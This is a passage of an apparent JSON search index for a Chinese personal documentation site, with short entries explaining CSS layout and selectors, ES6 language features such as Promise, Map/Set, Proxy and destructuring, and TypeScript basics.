元素外边距的颜色是由父代元素的颜色决定","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html"},{"title":"padding","text":"内边距","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html"},{"title":"position","text":"规定元素的定位类型 static: HTML 元素的默认值，即没有定位，遵循正常的文档流对象; 静态定位的元素不会受到 top, bottom, left, right影响; relative: 相对位置, 元素的定位是相对其正常位置; 移动相对定位元素，但它原本所占的空间不会改变; absolute: 绝对定位的元素的位置相对于最近的已定位父元素; 如果元素没有已定位的父元素，那么它的位置相对于<html>; fixed: 元素的位置相对于浏览器窗口是固定位置; 即使窗口是滚动的它也不会移动; sticky: 英文字面意思是粘，粘贴，所以可以把它称之为粘性定位; 基于用户的滚动位置来定位; 依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换; 行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置; 元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位; 特定阈值指的是 top, right, bottom 或 left 之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同;","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html"},{"title":"text-align","text":"设置 元素框内文本内容 的水平对齐方式 text-align 属性用于设置文本内容在元素框中的水平对齐方式。 它适用于块级元素和一些内联元素。 常见的值包括 left（默认值，左对齐） right（右对齐） center（居中对齐） justify（两端对齐） 等。该属性主要用于调整文本的对齐方式，而不是元素本身。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html"},{"title":"元素的出场顺序(z-index)","text":"原文: https://zhuanlan.zhihu.com/p/340371083 原文是讲解 z-index 作用的. 当没有 z-index 时 没有使用 z-index 的时候，元素的层叠关系由2个因素决定 元素的 position 是否是 static : static 或 non-positioned : 没有设置 position , 这个是默认值 positioned : position 值是 relative , absolute , fixed , 或 sticky 则称 positioned positioned 元素享受特权，会覆盖 non-positioned `元素; 而 `non-positioned 元素中，有 float 样式的元素覆盖 没有float 的 元素的\"出场\"顺序 —— 即在 html 中的顺序，同类型元素遵循 后来者居上 的原则 non-positioned / static / 无float 元素一般在最下面 当存在 z-index z-index 存在的一个背景是 Stacking Context ， 中文常译作层叠上下文 （其实数据结构中的栈的单词也是 stack，所以层叠上下文中已经蕴含了后来者居上的意思） 构建层叠上下文仿佛 盖楼: 首先， <html> 元素是地平线或地基 —— 所有楼都是从地基开始盖的 接下来，每产生一个层叠上下文，相当于盖一座楼， z-index 的值相当于楼的高度 以下几种元素可以产生层叠上下文，且z-index的值才有效: 元素的 position 值为 absolute 或 relative， 且 z-index 值不为 auto （默认值）. 元素的 position 值为 fixed 或 sticky 元素是 flexbox 容器的子元素， 且 z-index 值不为 auto （默认值） 元素是 grid 容器的子元素, 且 z-index 值不为 auto （默认值） 元素有 opacity 值且值小于 1. 元素有以下任意一项的值，且值不为 none transform filter perspective clip-path mask / mask-image / mask-border 元素有 isolation 值且值为 isolate . 元素有 mix-blend-mode 值且值不为 normal . 元素有 -webkit-overflow-scrolling 值且值为 touch . 还有少数几种冷门的情况 层叠上下文是可以嵌套的 —— 这是最容易让人误解的一块. 嵌套，顾名思义就是在一个 层叠上下文 中能创建 另一个层叠上下文。 假如在地基上盖一座50米高的楼 (即 z-index: 50 ), 有可能在楼里又盖一栋 100米高的楼中楼吗？当然不可能！ 但是你可以在这座楼里建一座 100 级阶梯高的大堂。 换句话说，在嵌套的层叠上下文中， 子层叠上下文被限制在了父层叠上下文中，它们的 z-index \"单位\"已经不一样了（z-index 没有单位，这边只是用于理解）， 无论 子层叠上下文的 z-index 值有多大都无法突破父层叠上下文的高度 层叠上下文小结: <html> 元素的第一级层叠上下文 特定样式的元素可以产生新的层叠上下文，且 z-index 的值在这些元素中才有效 子层叠上下文的\"高度\"被限制在了父层叠上下文中 在同级层叠上下文中，没有（有效） z-index 的元素依然遵循上一小节的规律； z-index 值相同的元素遵循后来者居上原则 注解 层叠上下文嵌套 与 元素嵌套 不是一一对应的关系， 一个元素所处的父层叠上下文是由内向外找到的第一个能产生层叠上下文的元素所产生的层叠上下文 例: <div id=\"div1\" style=\"position: relative; z-index: 1\"> <div id=\"div2\" style=\"position: relative; z-index: 1\"> 所处的父层叠上下文是 div1 产生的层叠上下文 </div> <div id=\"div3\"> <div id=\"div4\" style=\"position: relative; z-index: 2\"> 所处的父层叠上下文也是 div1 产生的层叠上下文 </div> </div> </div> 其他 记录一个现象, css生效不完全是按照定义的顺序来的, 尤其当样式定义与多个文件, 浏览器可能由于网络原因、加载机制等, 效果与导入顺序不一致; 且实际在开发theia项目中, 发现, 限制条件更明确的, 可能优先级更高, 比如 .cl1:hover 的优先级低于 .cl1:hover:not(:disabled):not(is-disabled) 暂时还没找到原因","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-The-order-of-elements.html","loc":"/yq-doc-source-docs-front-end-CSS-The-order-of-elements.html"},{"title":"前端各种选择器","text":"主要是三大类: ID选择器(#) 类选择器(.) HTML标签选择器 在CSS中定义样式时候, 有几种情况: 复合选择器: 无分隔符, 表示应用与同时具有这些名称的选择器; 如: .cl1.cl2 表示选择同时具有这两个类的元素; 选择器列表: 多个选择器以逗号(,)分割, 表示样式同时应用与这些选择器; 如: .cl1, .cl2 ; 后代组合器: 多个选择器以空格( )分割, 表示样式应用与 按照顺序选择满足条件的所有后代(后代选择器); 如: .cl1 .cl2 ; 直接子代组合器: 多个选择器以右箭头(>)分割, 表示样式应用与 按照顺序选择满足条件的直属子元素(子元素选择器); 如: .cl1 > .cl2 ; 紧邻兄弟组合器: 多个选择器以加号(+)分割, 表示样式应用与 选择紧接在另一个元素后的元素(相邻兄弟选择器); 如: .cl1 + .cl2 ; 一般兄弟组合器: 多个选择器以波浪(~)分割, 表示样式应用与 选择在一个元素后面的所有兄弟元素(通用兄弟选择器); 如: .cl1 ~ .cl2 ; 其他, 见: https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors 伪类/元素选择器 伪类选择器以一个冒号（:）开头 伪元素选择器以两个冒号（::）开头 根据规范，伪类选择器支持单冒号和双冒号的写法， 但在实际使用中，双冒号通常用于伪元素选择器，以区分伪元素和伪类。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-Various-selectors.html","loc":"/yq-doc-source-docs-front-end-CSS-Various-selectors.html"},{"title":"宽度-高度百分比说明","text":"关于height这种设置的属性为百分比计算 一般情况下, 不为绝对定位时候是使用父元素的宽高计算的. 更确切地说是 包含块 : 父元素的内容区（盒模型里的content） 实际生效的具体值的计算方式为: 元素的包含块大小 * 设定的百分比 注解 一般情况下, 不是绝对定位元素( position: absolute | fixed)、根元素 html 以及根字体, 元素的包含块就是父元素 什么是元素的包含块? 元素的包含块是指元素用来计算和定位的一个框; 对于开启绝对定位的元素来说，其包含块是离它最近的开启了定位（且position不为static）的祖先元素; 如果所有的祖先元素都没有开启定位，则其包含块就是初始包含块; 一般情况下，根元素（在很多场景下可以看成<html>）被称为初始包含块，其尺寸等同于浏览器可视窗口的大小; 对于其他元素，如果该元素的position是relative或者static，则包含块由其最近的块级祖先元素content box边界形成; 如果元素的position为fixed，则包含块是初始包含块; 如果元素position为absolute，则包含块由最近的position不为static的祖先元素建立; 有时候会发现设置的高度没有生效 原因是: 当一个元素的高度使用百分比值， 如果其包含块没有明确的高度定义（也就是说，取决于内容高度）， 且这个元素不是绝对定位，则该百分比值等同于auto。auto是初始默认值，所以看起来就像是\"失效\"了。 此部分参考: https://zhuanlan.zhihu.com/p/394791528 示例","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-Width-height-percentage-explanation.html","loc":"/yq-doc-source-docs-front-end-CSS-Width-height-percentage-explanation.html"},{"title":"css常见使用技巧","text":"元素从左到右排列 这些从左到右的元素设置 display 为 flex 即可: .container { display: flex; } 在这个基础上, 如果要再实现最后一个元素靠右, 那么可以: .item-right { /* 会移动到最右边 */ margin-left: auto; } div结构: <div class=\"container\"> xxx1 <div class=\"item\">xxx2</div> <div class=\"item-right\">xxx3</div> </div> 效果","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-common-use-of-CSS.html","loc":"/yq-doc-source-docs-front-end-CSS-common-use-of-CSS.html"},{"title":"ES6 数组","text":"数组创建 类数组对象 一个类数组对象必须含有 length 属性，且元素属性名必须是数值或者可转换为数值的字符 转换可迭代对象 转换 map: let map = new Map(); map.set('key0', 'value0'); map.set('key1', 'value1'); console.log(Array.from(map)); // [['key0', 'value0'],['key1', // 'value1']] 转换 set: let arr = [1, 2, 3]; let set = new Set(arr); console.log(Array.from(set)); // [1, 2, 3] 转换字符串: let str = 'abc'; console.log(Array.from(str)); // [\"a\", \"b\", \"c\"] 扩展的方法 查找 填充 遍历 包含 嵌套数组转一维数组","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Array.html","loc":"/yq-doc-source-docs-front-end-ES6-Array.html"},{"title":"async 函数","text":"async async 是 ES7 才有的与异步操作有关的关键字，和 Promise ， Generator 有很大关联的。 语法 返回值 async 函数返回一个 Promise 对象，可以使用 then 方法添加回调函数 await await 操作符用于等待一个 Promise 对象, 它只能在异步函数 async function 内部使用。 返回值 返回 Promise 对象的处理结果。如果等待的不是 Promise 对象，则返回该值本身。 await针对所跟不同表达式的处理方式： Promise 对象：await 会暂停执行，等待 Promise 对象 resolve，然后恢复 async 函数的执行并返回解析值。 非 Promise 对象：直接返回对应的值。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Async-function.html","loc":"/yq-doc-source-docs-front-end-ES6-Async-function.html"},{"title":"基本数据类型","text":"支持的数据类型: Number String Boolean Object null undefined Symbol (ES6新增); 每一个 Symbol 的值都是不相等的 有 Symbol.for() 的类似单例功能: let yellow = Symbol(\"Yellow\"); let yellow1 = Symbol.for(\"Yellow\"); yellow === yellow1; // false let yellow2 = Symbol.for(\"Yellow\"); yellow1 === yellow2; // true 和 Symbol.keyFor() 检查是否已登记: let yellow1 = Symbol.for(\"Yellow\"); Symbol.keyFor(yellow1); // \"Yellow\"","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Basic-data-type.html","loc":"/yq-doc-source-docs-front-end-ES6-Basic-data-type.html"},{"title":"ES6 Generator 函数","text":"ES6 新引入了 Generator 函数，可以通过 yield 关键字，把函数的执行流挂起， 为改变执行流程提供了可能，从而为异步编程提供解决方案 Generator 函数组成 Generator 有两个区分于普通函数的部分: 一是在 function 后面，函数名之前有个 * 函数内部有 yield 表达式 其中 * 用来表示函数为 Generator 函数，yield 用来定义函数内部的状态: function* func(){ console.log(\"one\"); yield '1'; console.log(\"two\"); yield '2'; console.log(\"three\"); return '3'; } 执行机制 调用 Generator 函数和调用普通函数一样，在函数名后面加上()即可， 但是 Generator 函数不会像普通函数一样立即执行，而是返回一个指向内部状态对象的指针， 所以要调用遍历器对象Iterator 的 next 方法，指针就会从函数头部或者上一次停下来的地方开始执行 函数返回的遍历器对象的方法 next 方法 一般情况下，next 方法不传入参数的时候，yield 表达式的返回值是 undefined . 当 next 传入参数的时候，该参数会作为上一步yield的返回值。 yield* 表达式 yield* 表达式表示 yield 返回一个遍历器对象，用于在 Generator 函数内部，调用另一个 Generator 函数。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Generator-function.html","loc":"/yq-doc-source-docs-front-end-ES6-Generator-function.html"},{"title":"Map与Set","text":"Map 对象 Map 对象保存键值对。任何值(对象或者原始值) 都可以作为一个键或一个值 Maps 和 Objects 的区别 一个 Object 的键只能是字符串或者 Symbols，但一个 Map 的键可以是任意值 Map 中的键值是有序的（FIFO 原则），而添加到对象中的键则不是 Map 的键值对个数可以从 size 属性获取，而 Object 的键值对个数只能手动计算 Object 都有自己的原型，原型链上的键名有可能和你自己在对象上的设置的键名产生冲突 Map的迭代 方法一, 使用 for ... of ... : var myMap = new Map(); myMap.set(0, \"zero\"); myMap.set(1, \"one\"); // 将会显示两个 log。 一个是 \"0 = zero\" 另一个是 \"1 = one\" for (var [key, value] of myMap) { console.log(key + \" = \" + value); } for (var [key, value] of myMap.entries()) { console.log(key + \" = \" + value); } /* 这个 entries 方法返回一个新的 Iterator 对象，它按插入顺序包含了 Map 对象中每个元素的 [key, value] 数组。 */ 方法二, 使用 forEach() : var myMap = new Map(); myMap.set(0, \"zero\"); myMap.set(1, \"one\"); // 将会显示两个 logs。 一个是 \"0 = zero\" 另一个是 \"1 = one\" myMap.forEach(function(value, key) { console.log(key + \" = \" + value); }, myMap) Map 对象的操作 Map 与 Array的转换 Map 构造函数可以将一个二维键值对数组转换成一个 Map 对象: var kvArray = [[\"key1\", \"value1\"], [\"key2\", \"value2\"]]; var myMap = new Map(kvArray); 使用 Array.from 函数可以将一个 Map 对象转换成一个二维键值对数组: var outArray = Array.from(myMap); Map 的克隆 var myMap1 = new Map([[\"key1\", \"value1\"], [\"key2\", \"value2\"]]); var myMap2 = new Map(myMap1); console.log(original === clone); // 打印 false。 Map 对象构造函数生成实例，迭代出新的对象。 Map 的合并 合并两个 Map 对象时，如果有重复的键值，则后面的会覆盖前面的，对应值即 uno，dos， three: var first = new Map([[1, 'one'], [2, 'two'], [3, 'three'],]); var second = new Map([[1, 'uno'], [2, 'dos']]); var merged = new Map([...first, ...second]); Set 对象 Set 对象允许你存储任何类型的唯一值，无论是原始值或者是对象引用 Set 中的特殊值 Set 对象存储的值总是唯一的，所以需要判断两个值是否恒等 有几个特殊值需要特殊对待： +0 与 -0 在存储判断唯一性的时候是恒等的，所以不重复； undefined 与 undefined 是恒等的，所以不重复； NaN 与 NaN 是不恒等的，但是在 Set 中只能存一个，不重复。 类型转换 Array Array 转 Set: var mySet = new Set([\"value1\", \"value2\", \"value3\"]); 用...操作符，将 Set 转 Array: var myArray = [...mySet]; String String 转 Set: var mySet = new Set('hello'); // Set(4) {\"h\", \"e\", \"l\", \"o\"} // 注：Set 中 toString 方法是不能将 Set 转换成 String 并集: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var union = new Set([...a, ...b]); // {1, 2, 3, 4} 交集: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var intersect = new Set([...a].filter(x => b.has(x))); // {2, 3} 差集: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var difference = new Set([...a].filter(x => !b.has(x))); // {1}","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-MAP-and-SET.html","loc":"/yq-doc-source-docs-front-end-ES6-MAP-and-SET.html"},{"title":"ES6 模块","text":"ES6 引入了模块化，其设计思想是在编译时就能确定模块的依赖关系，以及输入和输出的变量。 ES6 的模块化分为导出（export） @与导入（import）两个模块。 ES6 的模块自动开启严格模式，不管你有没有在模块头部加上 use strict;。 模块中可以导入和导出各种类型的变量，如函数，对象，字符串，数字，布尔值，类等。 每个模块都有自己的上下文，每一个模块内声明的变量都是局部变量，不会污染全局作用域。 每一个模块只加载一次（是单例的）， 若再去加载同目录下同文件，直接从内存中读取。 建议使用大括号指定所要输出的一组变量写在文档尾部，明确导出的接口。 函数与类都需要有对应的名称，导出文档尾部也避免了无对应名称。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Module.html","loc":"/yq-doc-source-docs-front-end-ES6-Module.html"},{"title":"ES6 对象","text":"对象字面量 简洁表示法: const age = 12; const name = \"Amy\"; const person = {age, name}; person //{age: 12, name: \"Amy\"} 等同于: const person = {age: age, name: name} 属性名表达式 ES6允许用表达式作为属性名，但是一定要将表达式放在方括号内: const obj = { [\"he\"+\"llo\"](){ return \"Hi\"; } } obj.hello(); //\"Hi\" 注解 属性的简洁表示法和属性名表达式不能同时使用，否则会报错。 对象的拓展运算符 拓展运算符（...）用于取出参数对象所有可遍历属性然后拷贝到当前对象 基本用法: let person = {name: \"Amy\", age: 15}; let someone = { ...person }; someone; //{name: \"Amy\", age: 15} 可用于合并两个对象: let age = {age: 15}; let name = {name: \"Amy\"}; let person = {...age, ...name}; person; //{age: 15, name: \"Amy\"} 注解 属性相同时, 后面的会覆盖掉前面的 对象的新方法","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Object.html","loc":"/yq-doc-source-docs-front-end-ES6-Object.html"},{"title":"ES6 Promise 对象","text":"异步编程的一种解决方案。 从语法上说，Promise 是一个对象，从它可以获取异步操作的消息 Promise 状态 状态的特点 Promise 异步操作有三种状态： pending（进行中） fulfilled（已成功） rejected（已失败） 除了异步操作的结果，任何其他操作都无法改变这个状态。 Promise 对象只有：从 pending 变为 fulfilled 和从 pending 变为 rejected 的状态改变。 只要处于 fulfilled 和 rejected ，状态就不会再变了即 resolved（已定型）。 状态的缺点 无法取消 Promise ，一旦新建它就会立即执行，无法中途取消 如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部 当处于 pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成） then 方法 then 方法接收两个函数作为参数， 第一个参数是 Promise 执行成功时的回调， 第二个参数是 Promise 执行失败时的回调，两个函数只会有一个被调用 then 方法的特点 在 JavaScript 事件队列的当前运行完成之前，回调函数永远不会被调用: const p = new Promise(function(resolve,reject){ resolve('success'); }); p.then(function(value){ console.log(value); }); console.log('first'); // first // success 通过 .then 形式添加的回调函数，不论什么时候，都会被调用。 通过多次调用 .then，可以添加多个回调函数，它们会按照插入顺序并且独立运行。 then 方法将返回一个 resolved 或 rejected 状态的 Promise 对象用于链式调用，且 Promise 对象的值就是这个返回值。 then 方法注意点 简便的 Promise 链式编程最好保持扁平化，不要嵌套 Promise。 注意总是返回或终止 Promise 链","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Promise-object.html","loc":"/yq-doc-source-docs-front-end-ES6-Promise-object.html"},{"title":"Reflect 与 Proxy","text":"https://www.runoob.com/w3cnote/es6-reflect-proxy.html 即反射与代理 Proxy Proxy 可以对目标对象的读取、函数调用等操作进行拦截，然后进行操作处理. 它不直接操作对象，而是像代理模式，通过对象的代理对象进行操作，在进行这些操作时，可以添加一些需要的额外操作。 用法: let proxy = new Proxy(target, handler) target: 需要代理的源对象 handler: 代理处理操作, 若为空即不做代理拦截处理 对象代理用例: let target = { name: 'Tom', age: 24 } let handler = { get: function(target, key) { console.log('getting '+key); return target[key]; // 不是target.key }, set: function(target, key, value) { console.log('setting '+key); target[key] = value; } } let proxy = new Proxy(target, handler) proxy.name // 实际执行 handler.get proxy.age = 25 // 实际执行 handler.set // getting name // setting age // 25 实例方法 erty 操作 ptor 属性 Reflect Reflect 可以用于获取目标对象的行为，它与 Object 类似，但是更易读，为操作对象提供了一种更优雅的方式. 它的方法与 Proxy 是对应的。 ES6 中将 Object 的一些明显属于语言内部的方法移植到了 Reflect 对象上（当前某些方法会同时存在于 Object 和 Reflect 对象上）， 未来的新方法会只部署在 Reflect 对象上。 Reflect 对象对某些方法的返回结果进行了修改，使其更合理。 Reflect 对象使用函数的方式实现了 Object 的命令式操作。 静态方法 Reflect.set(target, name, value, receiver) 将 target 的 name 属性设置为 value。返回值为 boolean ，true 表示修改成功，false 表示失败。当 target 为不存在的对象时，会报错。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Reflect-and-PROXY.html","loc":"/yq-doc-source-docs-front-end-ES6-Reflect-and-PROXY.html"},{"title":"ES6 字符串操作","text":"子串的识别 ES6 之前判断字符串是否包含子串，用 indexOf 方法，ES6 新增了子串的识别方法 includes()：返回布尔值，判断是否找到参数字符串 startsWith()：返回布尔值，判断参数字符串是否在原字符串的头部 endsWith()：返回布尔值，判断参数字符串是否在原字符串的尾部 字符串重复 字符串补全 padStart：返回新的字符串，表示用参数字符串从头部（左侧）补全原字符串。 padEnd：返回新的字符串，表示用参数字符串从尾部（右侧）补全原字符串。 模板字符串","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-String-operation.html","loc":"/yq-doc-source-docs-front-end-ES6-String-operation.html"},{"title":"数值","text":"常见数值表示 二进制表示法新写法: 前缀 0b 或 0B console.log(0b11 === 3); // true console.log(0B11 === 3); // true 八进制表示法新写法: 前缀 0o 或 0O console.log(0o11 === 9); // true console.log(0O11 === 9); // true 常量 Number.EPSILON Number.EPSILON 属性表示 1 与大于 1 的最小浮点数之间的差. 它的值接近于 2.2204460492503130808472633361816E-16，或者 2-52. 测试数值是否在误差范围内: 0.1 + 0.2 === 0.3; // false // 在误差范围内即视为相等 equal = (Math.abs(0.1 - 0.3 + 0.2) < Number.EPSILON); // true 属性特性: writable：false enumerable：false configurable：false 最大/最小安全整数 安全整数 安全整数表示在 JavaScript 中能够精确表示的整数， 安全整数的范围在 2 的 -53 次方到 2 的 53 次方之间（不包括两个端点）， 超过这个范围的整数无法精确表示。 最大安全整数 安全整数范围的上限，即 2 的 53 次方减 1 . 如: Number.MAX_SAFE_INTEGER + 1 === Number.MAX_SAFE_INTEGER + 2; // true Number.MAX_SAFE_INTEGER === Number.MAX_SAFE_INTEGER + 1; // false Number.MAX_SAFE_INTEGER - 1 === Number.MAX_SAFE_INTEGER - 2; // false 最小安全整数 安全整数范围的下限，即 2 的 53 次方减 1 的负数. 如: Number.MIN_SAFE_INTEGER + 1 === Number.MIN_SAFE_INTEGER + 2; // false Number.MIN_SAFE_INTEGER === Number.MIN_SAFE_INTEGER - 1; // false Number.MIN_SAFE_INTEGER - 1 === Number.MIN_SAFE_INTEGER - 2; // true 属性特性: writable：false enumerable：false configurable：false 方法 Number 对象新方法 Math 对象的扩展 ES6 在 Math 对象上新增了 17 个数学相关的静态方法，这些方法只能在 Math 中调用。 普通计算 数字处理 判断 对数方法 双曲函数方法 Math.sinh(x): 用于计算双曲正弦 Math.cosh(x): 用于计算双曲余弦 Math.tanh(x): 用于计算双曲正切 Math.asinh(x): 用于计算反双曲正弦 Math.acosh(x): 用于计算反双曲余弦 Math.atanh(x): 用于计算反双曲正切 指数运算符 指数运算符: 1 ** 2; // 1 // 右结合，从右至左计算 2 ** 2 ** 3; // 256 // **= let exam = 2; exam ** = 2; // 4","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Value.html","loc":"/yq-doc-source-docs-front-end-ES6-Value.html"},{"title":"变量声明/赋值","text":"普通赋值 let 声明的变量只在 let 命令所在的代码块内有效, 只能声明一次 var 在全局范围内有效, 可多次声明 const 声明一个只读的常量，一旦声明，常量的值就不能改变, 一旦声明必须初始化. const 其实保证的不是变量的值不变，而是保证变量指向的内存地址所保存的数据不允许改动. 对于简单类型（数值 number、字符串 string 、布尔值 boolean）,值就保存在变量指向的那个内存地址， 因此 const 声明的简单类型变量等同于常量. 而复杂类型（对象 object，数组 array，函数 function），变量指向的内存地址其实是保存了一个指向实际数据的指针, 所以 const 只能保证指针是固定的，至于指针指向的数据结构变不变就无法控制了，所以使用 const 声明复杂类型对象时要慎重。 解构赋值 解构赋值是对赋值运算符的扩展。 他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值 有两部分组成: 解构的源，解构赋值表达式的右边部分; 解构的目标，解构赋值表达式的左边部分. 如: let [a, , b] = [1, 2, 3]; // a = 1 // b = 3 let [a, ...b] = [1, 2, 3]; //a = 1 //b = [2, 3] 在数组的解构中，解构的目标若为可遍历对象，皆可进行解构赋值。可遍历对象即实现 Iterator 接口的数据: let [a, b, c, d, e] = 'hello'; // a = 'h' // b = 'e' // c = 'l' // d = 'l' // e = 'o' 带默认值的情况: let [a = 3, b = a] = []; // a = 3, b = 3 let [a = 3, b = a] = [1]; // a = 1, b = 1 let [a = 3, b = a] = [1, 2]; // a = 1, b = 2","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-Variable-statement.html","loc":"/yq-doc-source-docs-front-end-ES6-Variable-statement.html"},{"title":"ES6 函数","text":"函数参数的扩展 不定参数用来表示不确定参数个数，形如，...变量名， 由...加上一个具名参数标识符组成。具名参数只能放在参数组的最后，并且有且只有一个不定参数。 基本用法: function f(...values){ console.log(values.length); } f(1,2); //2 f(1,2,3,4); //4 箭头函数 箭头函数提供了一种更加简洁的函数书写方式。基本语法是: 参数 => 函数体 当箭头函数没有参数或者有多个参数，要用 () 括起来; 当箭头函数函数体有多行语句，用 {} 包裹起来，表示代码块 当箭头函数要返回对象的时候，为了区分于代码块，要用 () 将对象包裹起来: var f = (id,name) => ({id: id, name: name}); f(6,2); // {id: 6, name: 2} 注解 没有 this、super、arguments 和 new.target 绑定: var func = () => { // 箭头函数里面没有 this 对象， // 此时的 this 是外层的 this 对象，即 Window console.log(this) } func(55) // Window 箭头函数体中的 this 对象，是定义函数时的对象，而不是使用函数时的对象: function fn(){ setTimeout(()=>{ // 定义时，this 绑定的是 fn 中的 this 对象 console.log(this.a); },0) } var a = 20; // fn 的 this 对象为 {a: 18} fn.call({a: 18}); // 18 不可以作为构造函数，也就是不能使用 new 命令，否则会报错","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-function.html","loc":"/yq-doc-source-docs-front-end-ES6-function.html"},{"title":"ES6 类","text":"在ES6中，class (类)作为对象的模板被引入，可以通过 class 关键字定义类。 class 的本质是 function。 它可以看作一个语法糖，让对象原型的写法更加清晰、更像面向对象编程的语法。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-kind.html","loc":"/yq-doc-source-docs-front-end-ES6-kind.html"},{"title":"Promise","text":"为什么要使用 Promise 传统的异步请求如果存在多次处理, 那么结果就会是嵌套调用: const read_model = require('model'); const _file = './name.txt' read_model.readFile(_file,'utf8',function(err,data){ read_model.readFile(data, 'utf8',function(err,data){ read_model.readFile(data,'utf8',function(err,data){ console.log(data); }); }); }); 使用 Promise 可以将其更改为链式调用: function read(filename) { return new Promise((resolve, reject) => { read_model.read_model(filename, 'utf-8', (err, data) => { if (err) {reject(err);} resolve(data); }); }); } read(_file).then((data) => { return read(data); }).then((data) => { return read(data); }).then((data) => { console.log(data); }, err => { console.log(err); } ); 显著解决了异步编码风格问题, 嵌套调用的可读性维护性较差. 业界比较著名的实现 Promise 的类库有 bluebird、Q、ES6-Promise。 构造说明 构造说明: new Promise((resolve, reject) => {}) resolve 调用成功后执行, 如果是函数 resolve(success_data). 使用 value 保存成功状态的值. reject 调用失败后执行, 如果是函数 reject(err_msg). 使用 reason 保存失败状态的值. Promise 的状态不可逆，同时调用 resolve 函数和 reject 函数，默认会采取第一次调用的结果。 promise 有三个状态：pending，fulfilled，or rejected. 默认状态是 pending; 只能从pending到rejected, 或者从pending到fulfilled，状态一旦确认，就不会再改变; 调用 Promise , 会返回一个 Promise 对象 promise 必须有一个then方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, 和 promise 失败的回调 onRejected. 也可称为 thenable 如果调用 then 时，promise 已经成功，则执行onFulfilled，参数是promise的value； 如果调用 then 时，promise 已经失败，那么执行onRejected, 参数是promise的reason； 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个 then 的失败的回调onRejected； 注解 (resolve, reject) => {} 被称为 executor 函数 自定义 Promise , 实现需参考: Promises/A+规范 : 补充 Promise 表示一个异步操作的最终结果，与之进行交互的方式主要是 then 方法， 该方法注册了两个回调函数，用于接收 promise 的终值或本 promise 不能执行的原因。","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-promise.html","loc":"/yq-doc-source-docs-front-end-ES6-promise.html"},{"title":"基础语法","text":"TypeScript 程序由以下几个部分组成: 模块 函数 变量 语句和表达式 注释 代码的运行, 如有一个 eg.ts , 需要先转换为 js 代码: tsc eg.ts 注解 tsc通过node的npm安装: npm install typescript -g 然后就是普通的 js 那样执行: node eg.js 一些特点 区分大小写 空格制表符不敏感 分号可选 注释 // 或者 /* */","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-Basic-grammar.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Basic-grammar.html"},{"title":"TypeScript基础类型","text":"any: 任意类型 number: 数字类型, 双精度 64 位浮点值。它可以用来表示整数和分数 string: 字符串, 可使用 单/双/反引号定义, 其中反引号可用于定义多行文本以及使用变量(用$), 类似于Python的 f boolean: true, false enum: 枚举 void null: 表示对象值缺失。表示一个空对象引用. 用 typeof 检测 null 返回是 object undefined: 用于初始化变量为一个未定义的值. undefined 是一个没有设置值的变量. typeof 一个没有值的变量会返回 undefined never: never 是其它类型（包括 null 和 undefined）的子类型，代表从不会出现的值。","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-Basic-type.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Basic-type.html"},{"title":"ts的问号与叹号","text":"问号 ts中有四种使用方式 三目运算符 例: const isCN = country === 'China' ? true : false; 函数可选参数(可以理解为参数自动加上 undefined) 例: function getUsername(firstName: string, lastName?: string){} 类似与: function getUsername(firstName: string, lastName: string | undefined){} 可选成员（类、接口） 例: class A { name?: string } interface B { name?: string } 链判断运算符（ES2020 optional chaining operator） 例: const firstName = message?.body?.user?.firstName || 'default'; 感叹号 三个地方会用到: 一元运算符:: 例: const isShow = !isModalHide(); 成员(强调非空/已有值) 例: interface B { name?: string } // 因为接口B里面name被定义为可空的值，但是实际情况是不为空的， // 那么我们就可以通过在class里面使用！，重新强调了name这个不为空值 class A implemented B { name!: string } TypeScript 2.7 引入了一个新的控制类型检查的标记 --strictPropertyInitialization , 这个参数规定每个实例属性都会在构造函数里或使用属性初始化器赋值: class Person { name: string; country: string; constructor() { this.name = 'Louis'; } } 在 strictPropertyInitialization 打开的情况下，上面的代码编译器会报错: error 